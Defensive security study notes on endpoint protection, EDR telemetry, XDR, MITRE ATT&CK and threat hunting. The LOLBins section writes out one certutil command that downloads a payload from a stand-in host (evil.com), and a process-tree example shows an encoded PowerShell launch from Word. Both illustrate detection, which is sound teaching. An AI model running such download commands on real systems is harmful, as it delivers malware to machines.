### Endpoint Security and EDR

--> Chapter 5 covered SIEM/SOC at the network/log-aggregation level. This chapter zooms into a single endpoint (laptop, server, workstation) and covers how modern tools detect attacker behavior on that machine, and how "detect an incident" evolves into "actively hunt for one before it alerts."
--> An endpoint is any device that runs code and can be a foothold for an attacker: a laptop, a server, a phone, even a container host. Endpoint security is the practice of protecting that foothold.

## Traditional Antivirus (Signature-Based Detection)

--> Classic antivirus (AV) works by comparing files on disk (or files being executed) against a database of known-bad "signatures" — typically a hash (MD5/SHA256) of a known malicious file, or a byte pattern found inside it.
--> If a file's hash matches an entry in the signature database, AV flags/quarantines it. This is fundamentally a blacklist model: "we know this exact bad thing, block it."

Why signature-based AV alone is no longer enough against modern attackers:

1. Zero-day and novel malware
   --> Any malware that hasn't been seen and catalogued yet has no signature, so it sails straight past AV undetected. Attackers routinely test their payloads against VirusTotal before deployment specifically to confirm this.

2. Polymorphic / metamorphic malware
   --> Malware that automatically mutates its own code (changes byte patterns, re-packs itself, encrypts its payload differently) on every infection, producing a different hash each time, while the underlying behavior stays identical. A single signature can't keep up with infinite variants.

3. Fileless attacks / living-off-the-land (LOLBins)
   --> Attackers increasingly avoid dropping a malicious .exe on disk at all. Instead they abuse legitimate, already-trusted OS binaries (`powershell.exe`, `wmic.exe`, `mshta.exe`, `certutil.exe`, `rundll32.exe`) to download payloads, execute code in memory, and persist — there's no "file" for AV to scan a signature against.
   --> Example: `certutil.exe -urlcache -split -f http://evil.com/payload.exe out.exe` uses a legitimate Windows certificate utility to download a malicious file — this is a native, digitally-signed Microsoft binary doing the downloading, not malware.

4. Encrypted/packed payloads
   --> Malware wrapped in a custom packer/crypter changes its on-disk signature every build even though the unpacked payload is identical.

--> Next-Gen AV (NGAV) improved on this by adding machine-learning-based static analysis and some behavioral heuristics, but it's still fundamentally a prevention-at-execution-time tool — it decides pass/fail at the moment a file tries to run, then mostly stops watching.

## EDR (Endpoint Detection and Response)

--> EDR shifts the model from "block known-bad files" to "continuously record everything happening on the endpoint, then detect suspicious BEHAVIOR patterns and give responders the tools to investigate and act," even against attacks that never trip a signature.
--> Core idea: assume some attacks WILL get past prevention. EDR's job is to make sure that when they do, there is rich telemetry to detect it fast and the tooling to respond (isolate the host, kill the process, roll back changes) without needing to physically touch the machine.

What EDR actually collects (its telemetry sources):

1. Process creation and process trees
   --> Every process launch, its full command line, its parent process, and the chain of ancestry (parent → child → grandchild). This is arguably EDR's single most valuable data source.
   --> Example of a highly suspicious process tree that pure AV would likely miss entirely:
   ```
   winword.exe                       (user opened a Word doc)
   └── powershell.exe -enc <base64>  (Word spawned PowerShell — Word should NEVER do this)
       └── cmd.exe /c whoami         (PowerShell spawned a recon command)
   ```
   --> A Word document spawning PowerShell with an encoded (`-enc`) command-line argument is a textbook macro-malware / initial-access pattern. No file signature is needed to catch this — the PARENT-CHILD RELATIONSHIP itself is the detection.

2. Registry modifications
   --> Tracks writes to sensitive registry keys, especially ones used for persistence.
   --> Example: a write to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` adding a new auto-start entry is a classic persistence technique — EDR flags new/unusual entries in Run keys, services, and scheduled tasks as high-value signals.

3. Network connections (per-process)
   --> Not just "what traffic left the network" (that's the firewall/NIDS's job) but "which specific PROCESS on this host opened this specific connection to this specific IP/domain, on this port." Tying network activity to a process is something perimeter tools structurally cannot do.
   --> Example: `notepad.exe` making an outbound HTTPS connection to an unfamiliar IP is bizarre — a text editor has no legitimate reason to talk to the network — and is an immediate high-fidelity signal of process injection (a malicious payload injected into notepad's memory space to inherit its trusted reputation).

4. File system activity
   --> File creation/modification/deletion, especially in sensitive directories (`Startup` folders, `System32`), and mass file modification patterns (hundreds of files renamed/encrypted in seconds = ransomware signature at the behavioral level, regardless of which specific ransomware family it is).

5. Memory / in-process activity
   --> Some EDR agents hook into API calls (e.g., Windows `CreateRemoteThread`, `WriteProcessMemory`) to catch process injection, credential dumping (e.g., a process reading LSASS memory — a common technique to steal Windows credentials), and reflective DLL loading (loading a DLL directly from memory without ever touching disk).

6. User/logon activity
   --> Logon type (interactive, RDP, network, service), logon time, and account used, correlated with what that session did afterward.

--> All of this telemetry streams up to a central console (cloud or on-prem) where detection rules/ML models run across the ENTIRE FLEET at once, not just one machine — meaning an attacker technique seen on Server A can instantly generate a detection rule check against every other endpoint in the org.

EDR's "Response" half — actions an analyst can take remotely, without touching the physical device:

--> Isolate host: cuts the endpoint off from the network (usually still allowing the EDR agent's own management traffic) so an active attacker loses their C2 channel and can't move laterally, while the analyst investigates.
--> Kill process / quarantine file: terminate a malicious process or move a suspicious file to quarantine remotely.
--> Live response / remote shell: many EDR agents allow an analyst to open a remote terminal session on the endpoint to run investigative commands live, without needing physical or RDP access.
--> Rollback: some EDR products (particularly for ransomware) keep shadow copies/snapshots of files and can automatically restore encrypted files once the malicious process is killed.

--> Common commercial EDR products referenced in the industry: CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne, Carbon Black. Open-source/free options for home lab practice: Wazuh (also does SIEM), osquery (endpoint visibility/querying via SQL-like syntax), Velociraptor (forensics + hunting focused).

## XDR (Extended Detection and Response)

--> XDR takes the EDR concept (rich telemetry + behavioral detection + response actions) and extends it ACROSS layers beyond just the endpoint: network traffic, cloud workloads, email/identity systems, and endpoints are all correlated together in one platform.
--> The problem XDR solves: an EDR agent sees everything on the endpoint but is blind to what happened on the network or in the email gateway before the malware ever executed. A SIEM sees logs from everywhere but lacks the deep behavioral telemetry an EDR agent has. XDR is positioned as the convergence of both — one vendor's sensors deployed everywhere, correlated in one place, with response actions available across all of them (e.g., "isolate this endpoint AND disable this compromised email account AND block this IP at the firewall" as a single coordinated response to one incident).
--> Practical distinction that matters in interviews/job postings: EDR = endpoint-only telemetry + response. XDR = EDR's model generalized to endpoint + network + cloud + identity + email, usually from a single vendor's integrated stack. SIEM = log aggregation and correlation across (often third-party, heterogeneous) log sources, generally without the same depth of raw behavioral telemetry or built-in response actions.

## MITRE ATT&CK Framework

--> MITRE ATT&CK (Adversarial Tactics, Techniques, and Common Knowledge) is a publicly available, continuously updated knowledge base that catalogues real-world attacker behavior, organized as a matrix of Tactics (the attacker's GOAL at a given stage) and Techniques (the specific METHOD used to achieve that goal).
--> It exists to give defenders (and vendors, and threat intel reports) a shared, standardized vocabulary. Instead of a report vaguely saying "the malware persisted somehow," ATT&CK lets everyone say precisely "T1547.001 — Registry Run Keys / Startup Folder," which is unambiguous and directly actionable/searchable.

The Tactics (columns of the matrix) represent the attacker's overall kill-chain-like progression, including (not exhaustive):

1. Initial Access – how the attacker first gets in (phishing, exploiting a public-facing app, valid stolen credentials).
2. Execution – running attacker-controlled code on the target (PowerShell, scripting, scheduled tasks).
3. Persistence – maintaining access across reboots/logoffs (registry run keys, scheduled tasks, new services).
4. Privilege Escalation – going from a low-privilege foothold to admin/root/SYSTEM.
5. Defense Evasion – avoiding detection (disabling AV, obfuscating code, process injection).
6. Credential Access – stealing usernames/passwords/hashes/tokens (e.g., LSASS dumping).
7. Discovery – mapping out the environment the attacker landed in (what other hosts exist, what AD groups exist).
8. Lateral Movement – spreading from the initial foothold to other hosts (RDP, PsExec, pass-the-hash).
9. Collection – gathering the data the attacker actually wants.
10. Command and Control (C2) – maintaining a communication channel back to attacker infrastructure.
11. Exfiltration – getting the stolen data OUT of the network.
12. Impact – the final damaging action (ransomware encryption, data destruction, defacement).

--> Under each Tactic sit specific Techniques (and Sub-techniques), each with a unique ID. Concrete examples:

--> T1566.001 (Phishing: Spearphishing Attachment) under the Initial Access tactic — an attacker sends a targeted email with a malicious Word/Excel attachment containing a macro that, once enabled, downloads a second-stage payload. This directly maps to the `winword.exe → powershell.exe` process tree example above.
--> T1055 (Process Injection) under the Defense Evasion / Privilege Escalation tactics — malicious code is injected into the address space of a legitimate, trusted process (like `notepad.exe` or `explorer.exe`) so it inherits that process's trust and evades detections looking for "known-bad" processes. This maps directly to the "notepad.exe talking to the network" example above.
--> T1053.005 (Scheduled Task/Job: Scheduled Task) under Persistence AND Execution — an attacker creates a Windows Scheduled Task that re-launches their payload on every reboot or at a fixed interval, ensuring they keep access even if the machine is rebooted or the user logs off.

--> Practically, security teams use ATT&CK in several ways: mapping detection rules/SIEM alerts to specific technique IDs (so coverage gaps are visible — "we have zero detections written for Credential Access techniques"), mapping real incident timelines to ATT&CK IDs in post-incident reports, and using ATT&CK Navigator (a free heatmap tool) to visualize which techniques an org can currently detect versus which are blind spots.
--> ATT&CK is descriptive, not prescriptive — it doesn't tell you HOW to detect T1055, it just gives every team on earth the same name for the same behavior so intel/tooling/reports are all comparable.

## Threat Hunting

--> Threat hunting is the PROACTIVE search for attacker activity that has already evaded existing automated detections (AV, EDR rules, SIEM correlation rules) — as opposed to the REACTIVE model of simply waiting for an alert to fire and then investigating it.
--> Core assumption behind hunting: "assume breach." Somewhere in this environment, an attacker may already be present and simply hasn't tripped any alert yet. The hunter's job is to go looking anyway.

Alert-driven response (the default SOC workflow) vs hypothesis-driven hunting:

--> Alert-driven: a detection rule fires → an analyst triages the alert → confirms true/false positive → responds if real. This is reactive and entirely bounded by whatever detection logic already exists. If no rule exists for a given technique, that activity is invisible no matter how long it's been happening.
--> Hypothesis-driven hunting: a hunter starts from a THEORY about what an attacker might be doing (informed by threat intel, ATT&CK techniques, recent breach reports, or "gut feeling" from experience), then actively queries raw telemetry/logs to prove or disprove that theory — regardless of whether any alert fired.

Worked example of a hypothesis-driven hunt:

1. Hypothesis: "If an attacker has a foothold in our environment, they are likely using LOLBins for discovery, matching T1059 (Command and Scripting Interpreter) — specifically, `powershell.exe` or `cmd.exe` spawned by an unusual parent process, e.g. an Office application, and passing an encoded command line."
2. Query: search EDR/SIEM telemetry across the whole fleet for `parent_process IN (winword.exe, excel.exe, outlook.exe) AND child_process IN (powershell.exe, cmd.exe)`.
3. Refine: further filter for `command_line CONTAINS "-enc" OR "-EncodedCommand" OR "-nop" OR "-w hidden"` (common PowerShell obfuscation/evasion flags used by malware, rarely used by legitimate business scripts).
4. Result: this query surfaces three hosts nobody had flagged before, each showing the exact `winword.exe → powershell.exe -enc <base64>` pattern from a phishing document opened four days earlier that had bypassed the mail filter and the AV signature check (because the payload was novel/polymorphic).
5. Outcome: the hunt converts into a real incident (feeding straight into the IR lifecycle from Chapter 5 — Containment, Eradication, Recovery), AND — critically — a new permanent detection rule is written from this pattern so future occurrences alert automatically. This is how hunting programs mature an organization's detection coverage over time rather than just finding one-off incidents.

--> Threat hunting requires access to raw, queryable, retained telemetry (this is exactly what EDR/XDR provide) — you cannot hunt for something your tools never recorded in the first place. This is the direct practical link between this chapter's EDR telemetry section and the hunting section: EDR is the data source, ATT&CK is the vocabulary for building hypotheses, and hunting is the proactive discipline that uses both.
